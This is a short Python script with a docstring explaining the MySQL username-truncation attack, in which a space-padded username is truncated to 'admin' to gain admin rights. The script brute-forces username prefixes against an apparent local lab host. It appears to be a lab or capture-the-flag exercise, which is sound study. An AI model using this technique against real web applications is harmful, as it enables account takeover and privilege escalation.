#!/usr/bin/env python
"""
    mysql truncation test
    idea:

    1. there is an admin account.
    2. You create another admin account admin/mypw
        2.2 SELECT id FROM login where username = $username
        2.3 -> admin already exists
    3. You create another account with admin                 abc/mypw
        3.2 SELECT id FROM login where username = $username
        3.3 -> this user does not exist. lets create a new one
        3.4 INSERT INTO login(username, password VALUES('admin                 abc', mypw)
        3.5 -> in this case the length of username is limited to x (e. g. 20 chars.) 
               what is saved in the DB is: 'admin           '
    4. You login with admin           /mypw
    5. login succeeds (valid combination)
    6. Now the important part: The web application checks if you have admin permissions
    6.1 SELECT is_admin FROM login where username $username ('admin           ')
        -> results ('admin' user and 'admin           ') -> limit 1 tut auf jeden Fall, ohne normal auch, weil der admin user davor steht

    simple test:
    1. create a login with a long username
    2. try every combo until we succeed
"""

import requests
user="abcdefghijklmnopqrstuvwxyz0123456789abcdefghijklmnopqrstuvwxyz"
password="pass11"

for i in range(len(user)):
    resp = requests.post("http://kali:81/index.php", data=dict(user=user[:i],password=password)).text
    if "seecret" in resp:
        print "Winner is try {} with {}".format(i, user[:i])

def generate_long_user(N):
    import random
    import string
    print "".join(random.choice(string.ascii_lowercase+string.digits) for __ in range(N)) 

#generate_long_user(30)

